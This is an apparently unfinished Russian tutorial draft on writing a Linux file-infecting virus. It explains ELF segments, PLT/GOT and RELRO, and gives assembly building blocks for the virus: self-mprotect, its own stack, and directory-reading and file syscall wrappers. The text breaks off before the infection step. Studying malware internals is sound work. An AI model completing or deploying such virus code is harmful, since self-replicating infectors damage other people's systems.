#+STARTUP: showall indent hidestars

Пишем вирус под Linux с нуля: опыт и грабли

* Интро

[TODO:gmm] - КПДВ

Единственное руководство "для новичка" по написанию вирусов, что
мне удалось найти - это "Записки исследователя компьютерных вирусов"
Криса Касперски. Очень увлекательное чтение! Что если попробовать
реализовать пару идей оттуда? Сколько это займет времени для человека,
который ничего подобного раньше не делал? Какие подводные камни?

Так начался проект по написанию моего первого файлового вируса.

-=[cut]=-

Цель будет достигнута, если вирус сможет заразить файлы-мишени - т.е. это
такой маленький учебный проект на пару уикендов, войти и выйти. Ничего
сложного!

* План работ:

- пишем мишени
- пишем вирус
- ищем файлы
- инфицируем их (если еще не)
- проверяем что зараженные мишени работают
- пишем отчет

* Файлы мишени Section Header Table

Простейшая мишень (на Си):

#+BEGIN_SRC c :tangle hello.c

  /* gcc hello.c -o hello -ggdb */
  #include <stdio.h>
  #include <time.h>

  time_t rawtime;
  struct tm * timeinfo;

  int main()
  {
      printf( "Hello world!\n" );
      time ( &rawtime );
      timeinfo = localtime ( &rawtime );
      printf ( "Current local time and date: %s", asctime (timeinfo) );
      return 0;
  }

#+END_SRC

С++ вариант:

#+BEGIN_SRC cpp :tangle hello.cpp

  /* src: https://gist.github.com/ofan/721464 */
  /* g++ hello.cpp -o hellocpp -ggdb */
  #include <iostream>
  #include <sstream>
  #include <string>
  #include <vector>
  #include <list>
  #include <map>
  #include <stdlib.h>

  // return given mumber as a string
  std::string str(long n) { std::ostringstream os; os << n; return os.str(); }

  // return true iff given character is '0'..'9'
  bool isdig(char c) { return isdigit(static_cast<unsigned char>(c)) != 0; }


  ////////////////////// cell

  enum cell_type { Symbol, Number, List, Proc, Lambda };

  struct environment; // forward declaration; cell and environment reference each other

  // a variant that can hold any kind of lisp value
  struct cell {
      typedef cell (*proc_type)(const std::vector<cell> &);
      typedef std::vector<cell>::const_iterator iter;
      typedef std::map<std::string, cell> map;
      cell_type type; std::string val; std::vector<cell> list; proc_type proc; environment * env;
      cell(cell_type type = Symbol) : type(type), env(0) {}
      cell(cell_type type, const std::string & val) : type(type), val(val), env(0) {}
      cell(proc_type proc) : type(Proc), proc(proc), env(0) {}
  };

  typedef std::vector<cell> cells;
  typedef cells::const_iterator cellit;

  const cell false_sym(Symbol, "#f");
  const cell true_sym(Symbol, "#t"); // anything that isn't false_sym is true
  const cell nil(Symbol, "nil");


  ////////////////////// environment

  // a dictionary that (a) associates symbols with cells, and
  // (b) can chain to an "outer" dictionary
  struct environment {
      environment(environment * outer = 0) : outer_(outer) {}

      environment(const cells & parms, const cells & args, environment * outer)
          : outer_(outer)
      {
          cellit a = args.begin();
          for (cellit p = parms.begin(); p != parms.end(); ++p)
              env_[p->val] = *a++;
      }

      // map a variable name onto a cell
      typedef std::map<std::string, cell> map;

      // return a reference to the innermost environment where 'var' appears
      map & find(const std::string & var)
      {
          if (env_.find(var) != env_.end())
              return env_; // the symbol exists in this environment
          if (outer_)
              return outer_->find(var); // attempt to find the symbol in some "outer" env
          std::cout << "unbound symbol '" << var << "'\n";
          exit(1);
      }

      // return a reference to the cell associated with the given symbol 'var'
      cell & operator[] (const std::string & var)
      {
          return env_[var];
      }

  private:
      map env_; // inner symbol->cell mapping
      environment * outer_; // next adjacent outer env, or 0 if there are no further environments
  };


  ////////////////////// built-in primitive procedures

  cell proc_add(const cells & c)
  {
      long n(atol(c[0].val.c_str()));
      for (cellit i = c.begin()+1; i != c.end(); ++i) n += atol(i->val.c_str());
      return cell(Number, str(n));
  }

  cell proc_sub(const cells & c)
  {
      long n(atol(c[0].val.c_str()));
      for (cellit i = c.begin()+1; i != c.end(); ++i) n -= atol(i->val.c_str());
      return cell(Number, str(n));
  }

  cell proc_mul(const cells & c)
  {
      long n(1);
      for (cellit i = c.begin(); i != c.end(); ++i) n *= atol(i->val.c_str());
      return cell(Number, str(n));
  }

  cell proc_div(const cells & c)
  {
      long n(atol(c[0].val.c_str()));
      for (cellit i = c.begin()+1; i != c.end(); ++i) n /= atol(i->val.c_str());
      return cell(Number, str(n));
  }

  cell proc_greater(const cells & c)
  {
      long n(atol(c[0].val.c_str()));
      for (cellit i = c.begin()+1; i != c.end(); ++i)
          if (n <= atol(i->val.c_str()))
              return false_sym;
      return true_sym;
  }

  cell proc_less(const cells & c)
  {
      long n(atol(c[0].val.c_str()));
      for (cellit i = c.begin()+1; i != c.end(); ++i)
          if (n >= atol(i->val.c_str()))
              return false_sym;
      return true_sym;
  }

  cell proc_less_equal(const cells & c)
  {
      long n(atol(c[0].val.c_str()));
      for (cellit i = c.begin()+1; i != c.end(); ++i)
          if (n > atol(i->val.c_str()))
              return false_sym;
      return true_sym;
  }

  cell proc_length(const cells & c) { return cell(Number, str(c[0].list.size())); }
  cell proc_nullp(const cells & c)  { return c[0].list.empty() ? true_sym : false_sym; }
  cell proc_car(const cells & c)    { return c[0].list[0]; }

  cell proc_cdr(const cells & c)
  {
      if (c[0].list.size() < 2)
          return nil;
      cell result(c[0]);
      result.list.erase(result.list.begin());
      return result;
  }

  cell proc_append(const cells & c)
  {
      cell result(List);
      result.list = c[0].list;
      for (cellit i = c[1].list.begin(); i != c[1].list.end(); ++i) result.list.push_back(*i);
      return result;
  }

  cell proc_cons(const cells & c)
  {
      cell result(List);
      result.list.push_back(c[0]);
      for (cellit i = c[1].list.begin(); i != c[1].list.end(); ++i) result.list.push_back(*i);
      return result;
  }

  cell proc_list(const cells & c)
  {
      cell result(List); result.list = c;
      return result;
  }

  // define the bare minimum set of primintives necessary to pass the unit tests
  void add_globals(environment & env)
  {
      env["nil"] = nil;   env["#f"] = false_sym;  env["#t"] = true_sym;
      env["append"] = cell(&proc_append);   env["car"]  = cell(&proc_car);
      env["cdr"]    = cell(&proc_cdr);      env["cons"] = cell(&proc_cons);
      env["length"] = cell(&proc_length);   env["list"] = cell(&proc_list);
      env["null?"]  = cell(&proc_nullp);    env["+"]    = cell(&proc_add);
      env["-"]      = cell(&proc_sub);      env["*"]    = cell(&proc_mul);
      env["/"]      = cell(&proc_div);      env[">"]    = cell(&proc_greater);
      env["<"]      = cell(&proc_less);     env["<="]   = cell(&proc_less_equal);
  }


  ////////////////////// eval

  cell eval(cell x, environment * env)
  {
      if (x.type == Symbol)
          return env->find(x.val)[x.val];
      if (x.type == Number)
          return x;
      if (x.list.empty())
          return nil;
      if (x.list[0].type == Symbol) {
          if (x.list[0].val == "quote")       // (quote exp)
              return x.list[1];
          if (x.list[0].val == "if")          // (if test conseq [alt])
              return eval(eval(x.list[1], env).val == "#f" ? (x.list.size() < 4 ? nil : x.list[3]) : x.list[2], env);
          if (x.list[0].val == "set!")        // (set! var exp)
              return env->find(x.list[1].val)[x.list[1].val] = eval(x.list[2], env);
          if (x.list[0].val == "define")      // (define var exp)
              return (*env)[x.list[1].val] = eval(x.list[2], env);
          if (x.list[0].val == "lambda") {    // (lambda (var*) exp)
              x.type = Lambda;
              // keep a reference to the environment that exists now (when the
              // lambda is being defined) because that's the outer environment
              // we'll need to use when the lambda is executed
              x.env = env;
              return x;
          }
          if (x.list[0].val == "begin") {     // (begin exp*)
              for (size_t i = 1; i < x.list.size() - 1; ++i)
                  eval(x.list[i], env);
              return eval(x.list[x.list.size() - 1], env);
          }
      }
      // (proc exp*)
      cell proc(eval(x.list[0], env));
      cells exps;
      for (cell::iter exp = x.list.begin() + 1; exp != x.list.end(); ++exp)
          exps.push_back(eval(*exp, env));
      if (proc.type == Lambda) {
          // Create an environment for the execution of this lambda function
          // where the outer environment is the one that existed* at the time
          // the lambda was defined and the new inner associations are the
          // parameter names with the given arguments.
          // *Although the environmet existed at the time the lambda was defined
          // it wasn't necessarily complete - it may have subsequently had
          // more symbols defined in that environment.
          return eval(/*body*/proc.list[2], new environment(/*parms*/proc.list[1].list, /*args*/exps, proc.env));
      }
      else if (proc.type == Proc)
          return proc.proc(exps);

      std::cout << "not a function\n";
      exit(1);
  }


  ////////////////////// parse, read and user interaction

  // convert given string to list of tokens
  std::list<std::string> tokenize(const std::string & str)
  {
      std::list<std::string> tokens;
      const char * s = str.c_str();
      while (*s) {
          while (*s == ' ')
              ++s;
          if (*s == '(' || *s == ')')
              tokens.push_back(*s++ == '(' ? "(" : ")");
          else {
              const char * t = s;
              while (*t && *t != ' ' && *t != '(' && *t != ')')
                  ++t;
              tokens.push_back(std::string(s, t));
              s = t;
          }
      }
      return tokens;
  }

  // numbers become Numbers; every other token is a Symbol
  cell atom(const std::string & token)
  {
      if (isdig(token[0]) || (token[0] == '-' && isdig(token[1])))
          return cell(Number, token);
      return cell(Symbol, token);
  }

  // return the Lisp expression in the given tokens
  cell read_from(std::list<std::string> & tokens)
  {
      const std::string token(tokens.front());
      tokens.pop_front();
      if (token == "(") {
          cell c(List);
          while (tokens.front() != ")")
              c.list.push_back(read_from(tokens));
          tokens.pop_front();
          return c;
      }
      else
          return atom(token);
  }

  // return the Lisp expression represented by the given string
  cell read(const std::string & s)
  {
      std::list<std::string> tokens(tokenize(s));
      return read_from(tokens);
  }

  // convert given cell to a Lisp-readable string
  std::string to_string(const cell & exp)
  {
      if (exp.type == List) {
          std::string s("(");
          for (cell::iter e = exp.list.begin(); e != exp.list.end(); ++e)
              s += to_string(*e) + ' ';
          if (s[s.size() - 1] == ' ')
              s.erase(s.size() - 1);
          return s + ')';
      }
      else if (exp.type == Lambda)
          return "<Lambda>";
      else if (exp.type == Proc)
          return "<Proc>";
      return exp.val;
  }

  // the default read-eval-print-loop
  void repl(const std::string & prompt, environment * env)
  {
      for (;;) {
          std::cout << prompt;
          std::string line; std::getline(std::cin, line);
          std::cout << to_string(eval(read(line), env)) << '\n';
      }
  }

  int main ()
  {
      environment global_env; add_globals(global_env);
      repl("90> ", &global_env);
  }

#+END_SRC

После компиляции мы получаем ELF-файл. Он очень просто устроен: таблица
сегментов хранит записи с указателями на сегменты, таблица секций -
записи с указателями на секции в этих сегментах, а заголовок эльфа
содержит информацию, где найти обе эти таблицы в файле, сколько в них
записей, точку входа и т.д.:

#+NAME: elf
#+BEGIN_SRC ditaa :file ./img/elf.png
           +-------------------------------+
           | Заголовок ELF-файла           |
           | (ELF-header)                  |
           |                               |
           |   Phdr Table Offset >---------+----+
  +--------+-< Shdr Table Offset           |    |
  |        |        ...                    |    |
  |        +-------------------------------+    |
  |                                             |
  |        +-------------------------------+<---+
  |        | Таблица сегментов             |
  |        | (Program Header Table)        |
  |        |     1                         |
  |   +----+---< 2                         |
  |   |    |     ...                       |
  |   |    +-------------------------------+
  |   |
  |   |    +-------------------------------+
  |   |    | Segment 1 | Section A         |
  |   |    |           +-------------------|
  |   |    |           | Section B         |
  |   |    |           +-------------------|
  |   |    |           |      ...          |
  |   |    +-------------------------------+
  |   +--> +-------------------------------+
  |        | Segment 2 | Section C         |
  |        |           +-------------------|<---+
  |        |           | Section D         |    |
  |        |           +-------------------|    |
  |        |           |      ...          |    |
  |        +-------------------------------+    |
  |                                             |
  +------->+-------------------------------+    |
           | Таблица заголовков секций     |    |
           | (Section Header Table)        |    |
           |                         A     |    |
           |                         B     |    |
           |                         C     |    |
           |                         D >---+----+
           |                         ...   |
           +-------------------------------+
#+END_SRC

#+results: elf
[[file:./img/elf2.png]]

Интересно, что каждый сегмент, содержит внутри себя одну или несколько
секций. В документации указано, что таблица заголовков секций
необязательна, и чтобы проверить это, мы можем ее удалить. Для этого
лучше использовать утилиту ~sstrip~ из ELF Kickers, которую можно взять
тут: http://www.muppetlabs.com/%7Ebreadbox/software/elfkickers.html

Воспользовавшись ей получаем:

#+BEGIN_SRC sh
  $ sstrip hello
  $ readelf -S test_sect_tbl

  There are no sections in this file.

  $ ./hello
  Hello world
#+END_SRC

Действительно, Section Header Table не нужна, чтобы наш hello world мог
загрузиться и выполниться! Но сами секции внутри сегментов никуда не
делись, мы просто потеряли информацию о них. Настало время поговорить о
сегментах.

* Сегменты

Можно ожидать, что наша простая мишень будет иметь два сегмента - один
для кода, а второй для данных. Но ELF-ы умеют превосходить ожидания:

#+BEGIN_SRC sh
  $ readelf -l hello

  Elf file type is DYN (Shared object file)
  Entry point 0x10e0
  There are 13 program headers, starting at offset 64

  Program Headers:
    Type           Offset             VirtAddr           PhysAddr
                   FileSiz            MemSiz              Flags  Align
    PHDR           0x0000000000000040 0x0000000000000040 0x0000000000000040
                   0x00000000000002d8 0x00000000000002d8  R      0x8
    INTERP         0x0000000000000318 0x0000000000000318 0x0000000000000318
                   0x000000000000001c 0x000000000000001c  R      0x1
        [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2]
    LOAD           0x0000000000000000 0x0000000000000000 0x0000000000000000
                   0x00000000000006e0 0x00000000000006e0  R      0x1000
    LOAD           0x0000000000001000 0x0000000000001000 0x0000000000001000
                   0x00000000000002b5 0x00000000000002b5  R E    0x1000
    LOAD           0x0000000000002000 0x0000000000002000 0x0000000000002000
                   0x0000000000000188 0x0000000000000188  R      0x1000
    LOAD           0x0000000000002d98 0x0000000000003d98 0x0000000000003d98
                   0x0000000000000278 0x0000000000000290  RW     0x1000
    DYNAMIC        0x0000000000002da8 0x0000000000003da8 0x0000000000003da8
                   0x00000000000001f0 0x00000000000001f0  RW     0x8
    NOTE           0x0000000000000338 0x0000000000000338 0x0000000000000338
                   0x0000000000000020 0x0000000000000020  R      0x8
    NOTE           0x0000000000000358 0x0000000000000358 0x0000000000000358
                   0x0000000000000044 0x0000000000000044  R      0x4
    GNU_PROPERTY   0x0000000000000338 0x0000000000000338 0x0000000000000338
                   0x0000000000000020 0x0000000000000020  R      0x8
    GNU_EH_FRAME   0x0000000000002038 0x0000000000002038 0x0000000000002038
                   0x0000000000000044 0x0000000000000044  R      0x4
    GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000
                   0x0000000000000000 0x0000000000000000  RW     0x10
    GNU_RELRO      0x0000000000002d98 0x0000000000003d98 0x0000000000003d98
                   0x0000000000000268 0x0000000000000268  R      0x1

   Section to Segment mapping:
    Segment Sections...
     00
     01     .interp
     02     .interp .note.gnu.property .note.gnu.build-id .note.ABI-tag .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rela.dyn .rela.plt
     03     .init .plt .plt.got .plt.sec .text .fini
     04     .rodata .eh_frame_hdr .eh_frame
     05     .init_array .fini_array .dynamic .got .data .bss
     06     .dynamic
     07     .note.gnu.property
     08     .note.gnu.build-id .note.ABI-tag
     09     .note.gnu.property
     10     .eh_frame_hdr
     11
     12     .init_array .fini_array .dynamic .got
#+END_SRC

Что это? Вместо ожидаемых двух сегментов, мы получили это! Давайте
разбираться:

~PHDR-сегмент~ описывает саму Program Header Table. Мы видим, что он
начинается по смещению 0x40 байт от начала файла, сразу после
ELF-заголовка.

~INTERP-сегмент~ описывает "Program Interpreter" - это указатель на
строку (в секции .strtab), содержающую путь к динамическому
компоновщику. Этот сегмент содержит одну секцию .interp

~LOAD-сегмент-R~ - это первый LOAD-сегмент в файле. Он содержит несколько
секций, и первая из них - это .interp - мы ее только что видели в
предыдущем сегменте. Все LOAD-сегменты загружаются в память, когда
программа запускается. Первый LOAD-сегмент начинается с нулевого адреса,
значит он загружает в память все содержимое файла от его начала до
следующего LOAD-сегмента, который обычно содержит код. Это содержимое
будет доступно программе НА ЧТЕНИЕ.

~LOAD-сегмент-RE~ содержит код в секции .text, а в остальных своих
секциях все что к нему относится, например, .init и .fini, а также
секции, которые связаны с GOT и PLT (.plt, .plt.got,
.plt.sec). Содержимое эттого сегмента будет загружено с правами НА ЧТЕНИЕ
И ИСПОЛНЕНИЕ.

~LOAD-сегмент-R~ обычно содержит в себе данные, которые будут доступны НА
ЧТЕНИЕ, например в секции .rodata и также может содержать в себе секции
вида .eh_frame относящиеся к обработке ислючений.

~LOAD-сегмент-RW~ содержит данные, доступные НА ЧТЕНИЕ И ЗАПИСЬ (в
секциях .data, .bss, .init_array, .fini_array и. т. п.), секции,
связанные с GOT (.got)

~DYNAMIC-сегмент~ содержит одну секцию .dynamic - в ней лежит информация,
имеющая отношение к релокациям. Эта секция тоже доступна НА ЧТЕНИЕ И
ЗАПИСЬ.

~NOTE-сегменты~ имеет тип NOTE, мы можем просмотреть его с помощью
"readelf -n" и обычно там нет ничего интересного.

~GNU_ сегменты~ содержат таблицы для обработки исключений, стек и таблицы
связанные с релокациями

Все это вместе выглядит как-то так:

#+NAME: elf
#+BEGIN_SRC ditaa :file ./img/elf2.png
  +----------------------------+
  | Заголовок ELF-файла        |
  | (ELF-header)               |
  +----------------------------+

  +----------------------------+
  |Таблица заголовков сегментов|
  | (Program Header Table)     |
  +----------------------------+

  +----------------------------+
  | Segment (PHDR)             |
  +----------------------------+
  | Segment (INTERP)           |
  |    .interp                 |
  +----------------------------+
  | Segment (LOAD) R           |
  |    .interp                 |
  |      ...                   |
  +----------------------------+
  | Segment (LOAD) RE          |
  |    .text                   |
  |      ...                   |
  +----------------------------+
  | Segment (LOAD) R           |
  |      ...                   |
  +----------------------------+
  | Segment (LOAD) RW          |
  |      ...                   |
  +----------------------------+
  | Segment (DYNAMIC) RW       |
  |   .dynamic                 |
  +----------------------------+
  | Segment (NOTE)             |
  |     ...                    |
  +----------------------------+
  | Segment (GNU_...)          |
  |     ...                    |
  +----------------------------+

  +----------------------------+
  | Таблица заголовков секций  |
  | (Section Header Table)     |
  +----------------------------+
#+END_SRC

В этом прослеживается некоторая логика - все данные распределены по
секциям, а секции скомпонованы в сегменты в соответствии с правами
доступа к этим данным. Некоторые секции могут относиться к нескольким
сегментам одновременно - стоит это учитывать.

* Релокейты

Большинство серьезных программы используют разделяемые библиотеки,
который связываются динамически. Рассмотрим подробнее этот
механизм. Когда программе нужно вызвать функцию разделяемой библиотеки,
она делает вызов в специальную таблицу связи процедур (PLT - Procedure
Linkage Table).

Каждая запись этой таблицы содержит небольшой кусочек кода, который
выполняет коссвенный вызов нужной функции разделямой библиотеки. Этот
вызов коссвенный, потому что программа не знает адрес, где будет
находиться библиотека при каждом следующем запуске, ведь загрузчик
программ загружает библиотеки в адресное пространство процесса по
случайным адресам.

Чтобы узнать реальный адрес, кусочек кода из PLT должен обратиться к
GOT - Global Offset Table, Глобальной Таблице Смещений. Динамический
линкер заботится о том, чтобы там были были правильные значения. Как он
это делает?

При первом вызове разделяемой функции GOT содержит указатель обратно на
PLT, где вызывается динамический компоновщик для определения фактического
местоположения рассматриваемой функции. Найденное местоположение затем
записывается в GOT. При втором вызове функции GOT содержит известное
местоположение функции. Это называется «ленивое связывание».

Таким образом, мы видим, что PLT должна иметь права на исполнение, а
GOT - на запись, потому что связывание динамическим линкером выполняется
лениво, т.е. прямо во время работы программы, при первой попытке доступа
к соответствующей функции.

Из вышесказанного можно сделать несколько выводов. Во-первых, PLT должен
располагаться с фиксированным смещением от раздела .text, чтобы код знал
как его найти.

Во-вторых, поскольку GOT содержит данные, напрямую используемые
различными частями программы, его необходимо разместить по известному
статическому адресу в памяти.

Вот так это выглядит:

#+NAME: got_plt
#+BEGIN_SRC ditaa :file ./img/got_plt.png
        +-------------------+
        | Segment (LOAD) RE |
        |                   |
        +-------------------+
        | ...               |
        +-------------------+
  +-----| Section PLT       |<---+
  |     +-------------------+    |
  |     | Section TEXT      |----+
  |     +-------------------+
  |     | ...               |
  |     +-------------------+
  |
  |     +-------------------+
  |     | Segment (LOAD) RW |
  |     |                   |
  |     +-------------------+
  |     | ...               |
  |     +-------------------+
  +---->| Section GOT       |
        +-------------------+
        | ...               |
        +-------------------+
#+END_SRC

Поскольку GOT существует в заранее определенном месте в памяти,
программа, содержащая уязвимость, позволяющая злоумышленнику записать 4
байта в контролируемое место в памяти, может быть использована для
выполнения произвольного кода- атакующий может заменить адрес в записи
GOT, чтобы выполнить нужный ему код.

Чтобы предотвратить эту уязвимость, нужно убедиться, что компоновщик
разрешает все динамически связанные функции в начале выполнения, а затем
делает GOT доступным только для чтения. Этот метод называется RELRO и
гарантирует, что GOT не может быть перезаписан во время выполнения.

В частичном RELRO секция .got доступна только для чтения, но .got.plt все
еще доступен для записи. В то время как в полном RELRO и .got и .got.plt
помечен как доступен только для чтения.

И частичное, и полное RELRO изменяют порядок внутренних разделов данных
ELF, чтобы защитить их от перезаписи в случае переполнения буфера.

* Базовые принципы

Нужно сделать так, чтоб код вируса было относительно легко переписывать
из файла в файл, - желательно, чтобы код был как можно меньше.

К тому же, хорошо бы, чтоб вирус не зависел ни от каких библиотек,
поскольку в противном случае переносить его и обеспечивать его коррктную
работу становится значительно труднее. [TODO:gmm] - это самоочевидно, нет?

Учитывая эти факторы, наиболее удобным языком реализации является GNU
ассемблер. Для человека, который привык к синтаксису Intel, GNU asm
кажется совершенно наркоманским из-за аргументов, которые идут в обратном
порядке (сначала источник, потом приемник), но к нему быстро
привыкаешь. [TODO:gmm] - Мы же договорились выкинуть это словоблудие?

Необходимо, чтобы код и данные вируса находилось в секции .text, иначе
очень сложно урегулировать все ссылки.

** Разрешаем писать в сегмент кода

Используем вызов mprotect. Изменив права для страницы памяти, на
которой располагается код вируса, с чтение/исполнение на
чтение/исполнение/запись, мы разрешаем себе писать в код.

Мы загружаем адрес метки start, которая является началом вируса, и
выравниваем этот адрес по 4 кб, потому что mprotect может разрешить
изменение атрибутов только сначала страницы.

Так же mprotect надо сообщить размер памяти, для которой она выставляет
новые атрибуты. Поэтому мы загружаем адрес метки fin, которая находится в
самом конце вируса, и вычитаем из этой метки полученный выровненный
адрес. Если всё прошло хорошо, то mprotect вернет 0.

В противном случае мы выведем сообщение об ошибке и выйдем из вируса с
помощью макроса ERR_MSG.

#+NAME: _allow_write_into_code
#+BEGIN_SRC asm
  /// Разрешает коду вируса писать
  /// в самого себя
  _allow_write_into_code:
      push    %rdx
      push    %rcx
      push    %rdi
      push    %rsi

      lea     _start(%rip), %rdi
      and     $~0xFFF, %rdi       # ..in %RDI
      lea     _fin_infector(%rip), %rsi   # get end addr

      sub     %rdi, %rsi          # total size - %RSI
      mov     $0x7, %rdx          # RW+EXEC flags - $RDX
      mov     $0xA, %rax          # mprotect handle
      syscall

      test    %rax, %rax
      jne     _allow_write_into_code_error

      mov     %rax, mprotect_ok(%rip)
  _allow_write_into_code_exit:
      pop     %rsi
      pop     %rdi
      pop     %rcx
      pop     %rdx

      ret

      ERR_MSG _allow_write_into_code "mprotect in _start"

#+END_SRC

Вот так реализуется макрос:

#+NAME: _debug_msg
#+BEGIN_SRC asm
  /// Если эта переменная существует,
  /// макросы будут генерировать отладочный вывод

      .set DEBUG_MODE, 1

      // Макрос для генерации сообщений об ошибках

      .macro ERR_MSG name msg
          .ifdef DEBUG_MODE
              \name\()_error:
                  lea     \name\()_msg_e(%rip), %rsi
                  mov     $len_e_\name, %rdx
                    jmp     _error_msg
              \name\()_msg_e:
                  .ascii "ERR: \msg\()\n"
                  .set len_e_\name, . - \name\()_msg_e
          .else
              \name\()_error:
                  jmp     \name\()_exit
          .endif
      .endm

  /// печать сообщения об ошибке и выход
  /// из программы
  _error_msg:
      .ifdef DEBUG_MODE
      call    _my_write
      .endif
      jmp    _restore_registers_and_stack

#+END_SRC

Если мы находимся в дебаг-режиме, а мы в нем находимся по умолчанию, то
код, в который раскроется макрос, выведет заданное сообщение об ошибке, а
затем выйдет из вируса.

** Настраиваем стек для вируса

[TODO:gmm] - Ты говоришь выше, что вирус должен быть маленький, а потом
выделяешь 6000 байт прямо внутри .text - может быть есть вариант поэлегантнее?

Если мы не используем библиотеки, то нам придется настроить стек
вручную. Самый простой путь - это выделить память и установить в
регистр rsp - этот регистр указывает на вершину стека -
адрес-указатель на последние 8 байт этой памяти.

Сначала зарезервируем память. Мы рассчитываем, что 6 тыс. байт хватит на
все.

#+NAME: _my_stack
#+BEGIN_SRC asm

  _stack_top:
      .space 6000, 0

  _stack_bottom:
      .quad 0

#+END_SRC

Поскольку стек растет в сторону меньших адресов - то есть если в него
что-то запушить, то адрес в rsp уменьшится, а не увеличится - положим в
rsp адрес _stack_bottom, поскольку он больше. Больше ничего делать не
нужно, поскольку push и pop - запушить что-то в стек и снять что-то
снего - сделают всю работу за нас. Не забываем сохранить старое значение
RSP - оно нам понадобится, когда вирус закончит свою работу и передаст
управление коду мишени.

#+NAME: _set_rsp
#+BEGIN_SRC asm :noweb yes

      mov     %rsp, old_rsp(%rip)
      lea     _stack_bottom(%rip), %rsp

#+END_SRC

** Обертка для write

Нам однозначно придется выводить строки во время отладки, поэтому
реализуем вызов write. Его параметры - это указатель на строку и ее
длина - должны находиться в регистрах rdi и rsi.
Вывод всегда будет в stdout.

#+BEGIN_SRC asm

  /// WRITE TO STDOUT
  /// @PARAMS
  ///   - %RSI - msg pointer
  ///   - %RDX - msg size
  _my_write:
      mov      $0x1, %rax          # write
      mov      %rax, %rdi          # to stdout
      syscall
      ret

#+END_SRC

** strlen

Нам нужна длина строки, поэтому сделаем strlen (без syscall).  Функция
принимает указатель на строку в регистре rdi и проходится по нес с
помощью ~repne scasb~ до тех пор, пока не встретит 0, который
интерпретируется как конец строки.  Счетчиком символов выступает регистр
rcx, в который мы кладем число 0x64. Вряд ли мы будем печатать строку
длиной более 100 символов ([TODO:gmm] - это такое себе допущение), так
что счетчика должно хватить. Затем мы смотрим, насколько уменьшилось
число в rcx - это и будет длина строки.

#+NAME: _my_strlen
#+BEGIN_SRC asm

  /// _MY_STRLEN
  /// PARAMS -
  /// RDI - указатель на строку
  /// Изменяет STRING_LENGTH
  _my_strlen:
      xor     %rax, %rax

      push    %rcx
      push    %rbx

      test    %rdi, %rdi
      je      _my_strlen_fail
      // je      _my_strlen_error

      mov     $0x64, %rcx
      repne   scasb

      mov     $0x64, %rbx
      sub     %rcx, %rbx
      mov     %rbx, %rax
      dec     %rax

      mov     %rax, string_length(%rip)
      xor     %rax, %rax

      jmp    _my_strlen_exit

  _my_strlen_fail:
      mov     $-1, %rax

  _my_strlen_exit:
      pop     %rbx
      pop     %rcx

      ret

      ERR_MSG _my_strlen "_my_strlen: NULL pointer"

#+END_SRC

** Обертки open и close

Очевидно, что придется открывать и закрывать файлы. Системные вызовы open
и close, которые этим занимаются, реализовать совсем просто.
Вызов open принимает единственный параметр в регистре rdi - указатель на
имя файла. Это код настолько маленький, что мы даже не будем его выносить
в отдельную функцию.

#+NAME: _my_open
#+BEGIN_SRC asm

      mov     $0x2, %rax  # open syscall
      syscall

#+END_SRC

Системный вызов close реализуется так же просто. Его параметр в rdi - это
файловый дескриптор открытого файла, который нужны закрыть.

[TODO:gmm] Было бы неплохо номера системных вызовов вынести в константы
времени компиляции.

#+NAME: _my_close
#+BEGIN_SRC asm

      mov     $0x3, %rax  # close syscall
      syscall

#+END_SRC

** readdir

В начале этой статьи была обозначена цель: вирус должен заражать файлы в
текущей папке. Следовательно, он должен каким-то образом получать доступ
к их именам.

В этом нам поможет реализация readdir.

~readdir~ работает следующим образом: она открывает заданную директорию (
у нас она указана в переменной ~dir_name~) и вызывает системный вызов
~getdents~, который считает все записи из каталога в буфер ~dir_buf~.
Таким образом мы получаем структуры записей всех файлов и папок в
заданном каталоге. В каждой такой структуре содержится и имя файла.
Так же мы сохраним указатель на первую структуру в буфере - это позволит
сдвигать указатель на следующую структуру файла, чтоб добыть его имя,
если предыдущий файл не подошел для заражения по какой-то причине.

#+NAME: _my_readdir
#+BEGIN_SRC asm

  /// Открывает директорию
  /// и считывает все ее записи в буфер
  _my_readdir:
      push    %rdi
      push    %rsi
      push    %rbx

      // открыть директорию
      lea     dir_name(%rip), %rdi
      mov     $0x0, %rsi
      mov     $0x2, %rax  # fopen syscall
      syscall
      test     %rax, %rax
      jl      _my_readdir_open_error

      // заполянем структуру потока
      lea     dir_struct(%rip), %rbx
      mov     %eax, (%rbx)
      movq    $0x8000, 0x8(%rbx) # размер буфера


      // параметры getdents
      mov     (%rbx), %rdi
      lea     dir_buf(%rip), %rsi
      mov     8(%rbx), %rdx

      // вызов getdents
      mov    $0x4e, %rax
      syscall

      // в случае успеха возвращ.
      // кол-во считанных байт
      // иначе 0
      cmp     $0x0, %rax
      jle     _my_readdir_read_error

      // сохранили указатель на первую структуру
      // в буфере
      lea     dir_buf_ptr(%rip), %rbx
      mov     %rsi, (%rbx)

      xor     %rax, %rax
      pop     %rbx
      pop     %rsi
      pop     %rdi
      ret

      ERR_MSG _my_readdir_open "_my_readdir: Can't open directory"
      ERR_MSG _my_readdir_read "_my_readdir: Can't read directory"

#+END_SRC

** Обертка для stat

Нам часто нужно будет узнавать свойства файла - например, его
размер. Добиться этого возможно с помощью stat.

#+NAME: _my_stat
#+BEGIN_SRC asm

/// MY_STAT
/// @PARAMS
/// %RDI - file name
/// %RSI - stat struct pointer
_my_stat:
    push    %rcx
    mov     $0x04, %rax

    syscall

    test    %rax, %rax
    jnz     _my_stat_error
_my_stat_exit:
    pop     %rcx
    ret

    ERR_MSG _my_stat "my_stat"

#+END_SRC

Мы реализауем еще некоторые библиотечные функции, но они будут показаны
позже, в контексте идеи инфицирования.

** Обертка для exit

Мы никогда не задумываемся о том, как завершается наша программа,
кажется, что она завершается вместе с функцией ~main~, хотя это не совсем
так. Если у вас динамически слинкованный файл, то после последней
инструкции ~ret~ управление перехватит библиотека ~libc~, которая
завершит процесс окончатльно.

Но мы не используем библиотеки, поэтому придется убивать текущий процесс
вручную. В этом нам поможет системный взов ~exit~.

[TODO:gmm] Слишком много объяснялок очевидного. Можно уложиться в одно
предложение. Отметь что это только для нулевого поколения вируса

** Вот его реализация

#+NAME: _global_exit
#+BEGIN_SRC asm

  /// выход из инфектора
  _global_exit:
      mov $0x3c, %rax
      mov $0x0,  %rdi
      syscall

#+END_SRC

* Проблема инфицирования

Куда же в этой запутанной структуре мы можем вставить свой вирус?
Учитываем, что:
- Сегмент вируса должен загрузиться в память, следовательно, он должен
  быть частью какого-то LOAD-сегмента мишени или же иметь свой
